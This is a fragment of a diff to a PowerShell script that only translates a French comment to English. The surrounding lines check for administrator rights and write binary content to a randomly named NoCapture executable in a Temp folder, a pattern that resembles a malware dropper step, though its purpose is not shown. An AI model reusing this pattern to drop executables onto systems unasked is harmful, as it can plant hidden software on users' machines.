@@ -57,7 +57,7 @@ foreach ($path in $paths) {
 $rand = [Guid]::NewGuid().Guid
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\NoCapture_$rand.exe" } else { "$env:USERPROFILE\AppData\Local\Temp\NoCapture_$rand.exe" }
-# Écrire le contenu binaire directement dans le fichier
+# Write the binary content directly to the file
 [System.IO.File]::WriteAllBytes($FilePath, $content)
 CheckFile $FilePath
 
